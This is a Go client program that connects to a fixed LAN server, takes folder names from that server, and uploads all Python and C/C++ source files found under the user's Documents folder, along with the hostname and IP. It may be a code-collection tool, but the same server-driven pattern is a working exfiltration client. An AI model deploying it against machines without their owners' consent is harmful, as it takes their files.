package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
    "path/filepath"
    "strings"
    "time"
    "encoding/json"
)

type FileInfo struct {
    RelativePath string
    Content      []byte
    ClientIP     string
    Username     string
}

func main() {
    // Get server IP from args or use default
    serverIP := "192.168.2.50:8080"
    if len(os.Args) > 1 {
        serverIP = os.Args[1] + ":8080"
    }

    // Get client information
    hostname, err := os.Hostname()
    if err != nil {
        fmt.Printf("Error getting hostname: %v\n", err)
        return
    }

    // Connect to server with retry
    conn, err := connectWithRetry(serverIP)
    if err != nil {
        fmt.Printf("Failed to connect after multiple attempts: %v\n", err)
        return
    }
    defer conn.Close()

    // Get path patterns from server
    patterns, err := getPathPatternsFromServer(conn)
    if err != nil {
        fmt.Printf("Error getting patterns from server: %v\n", err)
        return
    }

    // Get documents folder path
    docPath, err := getDocumentsPath()
    if err != nil {
        fmt.Printf("Error getting documents path: %v\n", err)
        return
    }

    // Search and send files
    err = searchAndSendFiles(docPath, patterns, conn, hostname)
    if err != nil {
        fmt.Printf("Error during file operations: %v\n", err)
    }
}

func connectWithRetry(serverIP string) (net.Conn, error) {
    for {
        conn, err := net.Dial("tcp", serverIP)
        if err == nil {
            fmt.Println("Connected to server successfully")
            return conn, nil
        }
        fmt.Printf("Failed to connect to server, retrying in 5 seconds...\n")
        time.Sleep(5 * time.Second)
    }
}

func getPathPatternsFromServer(conn net.Conn) ([]string, error) {
    reader := bufio.NewReader(conn)
    patternsJSON, err := reader.ReadString('\n')
    if err != nil {
        return nil, fmt.Errorf("error reading patterns: %v", err)
    }

    var patterns []string
    err = json.Unmarshal([]byte(patternsJSON), &patterns)
    if err != nil {
        return nil, fmt.Errorf("error unmarshaling patterns: %v", err)
    }

    return patterns, nil
}

func getDocumentsPath() (string, error) {
    homeDir, err := os.UserHomeDir()
    if err != nil {
        return "", err
    }
    return filepath.Join(homeDir, "Documents"), nil
}

func searchAndSendFiles(rootPath string, patterns []string, conn net.Conn, hostname string) error {
    for _, pattern := range patterns {
        var files []string
        err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
            if err != nil {
                return err
            }
            
            if level := strings.Count(path[len(rootPath):], string(os.PathSeparator)); level > 5 {
                return filepath.SkipDir
            }

            if info.IsDir() && strings.EqualFold(info.Name(), pattern) {
                err := processDirectory(path, conn, rootPath, hostname)
                if err != nil {
                    fmt.Printf("Error processing directory %s: %v\n", path, err)
                }
                return filepath.SkipDir
            }
            return nil
        })

        if err != nil {
            fmt.Printf("Error walking path for pattern %s: %v\n", pattern, err)
        }

        if len(files) == 0 {
            fmt.Printf("No matching files found for pattern: %s\n", pattern)
        }
    }
    return nil
}

func processDirectory(dirPath string, conn net.Conn, rootPath string, hostname string) error {
    return filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }

        if !info.IsDir() && (strings.HasSuffix(info.Name(), ".py") || 
                            strings.HasSuffix(info.Name(), ".cpp") ||
                            strings.HasSuffix(info.Name(), ".c")) {
            relPath, err := filepath.Rel(rootPath, path)
            if err != nil {
                return err
            }

            content, err := os.ReadFile(path)
            if err != nil {
                return err
            }

            fileInfo := FileInfo{
                RelativePath: relPath,
                Content:      content,
                ClientIP:     getLocalIP(),
                Username:     hostname,
            }

            encoder := json.NewEncoder(conn)
            if err := encoder.Encode(fileInfo); err != nil {
                return fmt.Errorf("error sending file info: %v", err)
            }

            fmt.Printf("Sent file: %s\n", relPath)
        }
        return nil
    })
}

func getLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return ""
    }
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }
    return ""
}